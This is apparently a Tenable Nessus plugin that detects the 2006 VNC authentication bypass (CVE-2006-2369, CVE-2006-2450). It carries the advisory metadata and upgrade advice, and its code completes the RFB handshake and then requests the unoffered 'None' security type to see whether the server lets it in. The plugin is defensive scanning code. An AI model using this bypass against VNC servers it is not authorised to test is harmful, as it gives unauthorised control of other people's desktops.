#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(21564);
  script_version("$Revision: 1.29 $");
  script_cvs_date("$Date: 2017/04/20 13:20:51 $");

  script_cve_id("CVE-2006-2369", "CVE-2006-2450");
  script_bugtraq_id(17978, 18977);
  script_osvdb_id(25479, 27137);
  script_xref(name:"CERT", value:"117929");
  script_xref(name:"EDB-ID", value:"1791");

  script_name(english:"VNC Security Type Enforcement Failure Remote Authentication Bypass");
  script_summary(english:"Tries to bypass authentication using a type of None.");

 script_set_attribute(attribute:"synopsis", value:
"The remote VNC server is affected by multiple authentication bypass
vulnerabilities.");
 script_set_attribute(attribute:"description", value:
"The version of VNC server running on the remote host is affected by
the following vulnerabilities :

  - A flaw exists in RealVNC due to an error when handling
    password authentication. A remote attacker can exploit
    this to bypass authentication by using a specially
    crafted request in which the client specifies an
    insecure security type (e.g., 'Type 1 - None'), which is
    accepted even if not offered by the server.
    (CVE-2006-2369)

  - A flaw exists in LibVNCServer within file auth.c due to
    an error when handling password authentication. A remote
    attacker can exploit this to bypass authentication by
    using a specially crafted request in which the client
    specifies an insecure security type (e.g., 'Type 1 -
    None'), which is accepted even if not offered by the
    server. (CVE-2006-2450)");
  # http://www.intelliadmin.com/index.php/2006/05/security-flaw-in-realvnc-411/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ef2b8a64" );
  # https://web.archive.org/web/20060623010008/http://www.realvnc.com/products/free/4.1/release-notes.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8a2c16a0");
  # https://web.archive.org/web/20060623010103/http://www.realvnc.com/products/personal/4.2/release-notes.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b218067e");
  # https://web.archive.org/web/20060623010019/http://www.realvnc.com/products/enterprise/4.2/release-notes.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?519d872d");
  script_set_attribute(attribute:"see_also", value:"https://github.com/LibVNC/libvncserver");
  script_set_attribute(attribute:"solution", value:
"If using RealVNC, upgrade to RealVNC Free Edition 4.1.2 / Personal
Edition 4.2.3 / Enterprise Edition 4.2.3 or later.

If using LibVNCServer, upgrade to version 0.8.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:ND/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:X/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');

  script_set_attribute(attribute:"vuln_publication_date", value: "2006/05/15");
  script_set_attribute(attribute:"patch_publication_date", value: "2006/06/23");
  script_set_attribute(attribute:"plugin_publication_date", value: "2006/05/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:vnc:realvnc");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:libvncserver:libvncserver");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2006-2017 Tenable Network Security, Inc.");

  script_dependencies("vnc.nasl");
  script_require_ports("Services/vnc", 5900);

  exit(0);
}

include("audit.inc");
include("byte_func.inc");
include("global_settings.inc");
include("misc_func.inc");

protocol = "VNC Service";
port = get_kb_item("Services/vnc");
if (!port) port = 5900;
if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);

# Establish a connection.
soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);

# nb: The RFB protocol is described at:
#     http://www.realvnc.com/docs/rfbproto.pdf


# Get the protocol version supported by the server.
s = recv(socket:soc, length:512, min:12);
if (empty_or_null(s) || strlen(s) < 12)
{
  close(soc);
  audit(AUDIT_NO_BANNER, port);
}

v = pregmatch(pattern:'^RFB ([0-9]+)\\.([0-9]+)\n', string:s);
if (empty_or_null(v))
{
  close(soc);
  audit(AUDIT_NO_BANNER, port);
}
ver_major = int(v[1]);
ver_minor = int(v[2]);

# nb: protocol versions before 3.7 don't allow the
#     client to select the authentication type.
if (ver_major != 3 || ver_minor < 7)
{
  close(soc);
  audit(AUDIT_INST_VER_NOT_VULN, protocol);
}

# Reply with same version.
send(socket:soc, data:s);

# Read the security types supported by the server.
types = NULL;
set_byte_order(BYTE_ORDER_BIG_ENDIAN);
s = recv(socket:soc, length:1, min:1);

if (empty_or_null(s))
{
  close(soc);
  audit(AUDIT_SOCK_FAIL, port);
}

if (strlen(s) == 1)
{
  n = ord(s);
  if (n > 0)
  {
    for (i=0; i<n; i++)
    {
      s = recv(socket:soc, length:1, min:1);
      if (empty_or_null(s))
      {
        close(soc);
        audit(AUDIT_SOCK_FAIL, port);
      }
      if (isnull(types)) types = make_list(ord(s));
      else types = make_list(types, ord(s));
    }
  }
}


if (types)
{
  # Make sure authentication is required.
  auth_required = 1;
  foreach type (types)
    # nb: type == 0 => connection failed.
    if (type == 0) auth_required = 0;
    # nb: type == 1 => None is supported.
    else if (type == 1) auth_required = 0;

  # If it is...
  if (auth_required)
  {
    # Try to bypass authentication.
    send(socket:soc, data:mkbyte(1));

    # If the protocol is below 3.8, send a ClientInit and look for a ServerInit.
    if (ver_minor < 8)
    {
      # Set Shared-Flag to true.
      send(socket:soc, data:mkbyte(1));
      s = recv(socket:soc, length:128);

      # There's a problem if it looks like a ServerInit
      if (! empty_or_null(s)
         && strlen(s) >= 24
         && getdword(blob:s, pos:0x14) + 24 == strlen(s)
      )
      {
        security_hole(port);
      }
      else
      {
        close(soc);
        audit(AUDIT_INST_VER_NOT_VULN, protocol);
      }
    }
    # If the protocol is 3.8, check the SecurityResult message.
    else
    {
      s = recv(socket:soc, min:3, length:8);
      # There's a problem if it's an OK response of four null bytes.
      if (! empty_or_null(s) && s == mkdword(0))
      {
        security_hole(port);
      }
      else
      {
        close(soc);
        audit(AUDIT_INST_VER_NOT_VULN, protocol);
      }
    }
  }
  else
  {
    close(soc);
    audit(AUDIT_INST_VER_NOT_VULN, protocol);
  }
}
else
{
  close(soc);
  audit(AUDIT_INST_VER_NOT_VULN, protocol);
}

close(soc);
